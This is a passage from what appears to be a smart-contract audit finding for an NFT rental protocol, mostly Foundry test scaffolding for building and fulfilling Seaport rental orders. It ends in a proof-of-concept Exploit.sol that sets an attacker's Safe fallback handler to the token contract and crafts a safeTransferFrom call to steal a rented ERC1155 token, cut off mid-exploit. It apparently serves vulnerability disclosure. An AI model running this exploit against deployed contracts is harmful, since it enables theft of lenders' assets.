.withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        function test_ERC721_1155_Exploit() public {\n\n            vm.stopPrank();\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 0,\n                erc1155Offers: 1,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n\n            // Assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // Assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);\n\n            // assert that the fulfiller made a payment\n            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));\n\n            // assert that a payment was made to the escrow contract\n            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n            // assert that a payment was synced properly in the escrow contract\n            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The `setFallbackHandler` TX\n            bytes memory transaction = abi.encodeWithSelector(\n                Safe.setFallbackHandler.selector,\n                address(address(erc1155s[0]))\n            );\n\n            // The signature of the `setFallbackHandler` TX\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(attacker.safe),\n                transaction\n            );\n\n            // Execute the transaction on attacker's safe\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(attacker.safe),\n                transaction,\n                transactionSignature\n            );\n\n            /** ----------------- Exploitation ----------------- */\n\n            // TX calldata\n            bytes memory hijackTX = abi.encodeWithSignature(\n                \"safeTransferFrom(address,address,uint256,uint256,bytes)\",\n                address(attacker.safe),\n                address(attacker.addr),\n                0,\n                100,\n                \"\"\n            );\n\n            // The 